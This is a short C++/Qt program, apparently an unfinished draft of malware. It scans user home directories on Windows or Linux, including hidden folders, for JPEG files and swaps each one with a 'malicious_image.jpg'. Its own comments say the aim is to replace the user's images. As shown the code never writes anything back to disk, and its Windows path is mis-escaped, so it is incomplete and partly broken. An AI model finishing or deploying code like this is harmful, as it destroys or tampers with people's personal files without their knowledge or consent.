#include <QCoreApplication>
#include <QDirIterator>
#include <QDir>
#include <QtGui/QImage>
#include <iostream>
#include <stdio.h>
using namespace std;

/* Taken from: https://stackoverflow.com/questions/15580179/how-do-i-find-the-name-of-an-operating-system
    Finds the OS type, for use when finding relevant directories */
string getOsName(){
    #ifdef _WIN32
    return "Windows";
    #elif _WIN64
    return "Windows";
    #elif __APPLE__ || __MACH__
    return "Mac OSX";
    #elif __linux__
    return "Linux";
    #else
    return "Other";
    #endif
}

int main(/*int argc, char *argv[]*/){
    //QCoreApplication a(argc, argv);
    string osName = getOsName();
    QString dir;

    // TODO: Load default image to swap
    QImage* maliciousImage = new QImage();
    bool malImageLoad = maliciousImage->load("./malicious_image.jpg");
    if(!malImageLoad){
        exit(-1);
    }

    if(osName == "Windows"){
        dir = QString("C:\Users");
    }else if(osName == "Linux"){
        dir = QString("/home");
    }else if(osName == "Mac OSX"){
        dir = QString("...");   // Fuck Macs
    }else{ // Default to linux
        dir = QString("/home");
    }
    QDir* dirFilters = new QDir();
    dirFilters->setFilter(QDir::AllDirs | QDir::Files | QDir::Hidden | QDir::NoSymLinks | QDir::NoDotDot);

    QDirIterator itr(dir, QStringList() << "*.jpg", dirFilters->filter(), QDirIterator::Subdirectories);
    while(itr.hasNext()){
        QImage* fImage = new QImage();
        bool imageLoaded = fImage->load(itr.next());
        if(!imageLoaded){   // Error loading image, skip it
            continue;
        }
        fImage->swap(*maliciousImage);    // Swap user's image with malicious one
        // TODO: Do we need to save this image?
        //QFile f(itr.next());
        //qDebug() << itr.next();
    }

    //return a.exec();
    return 0;
}
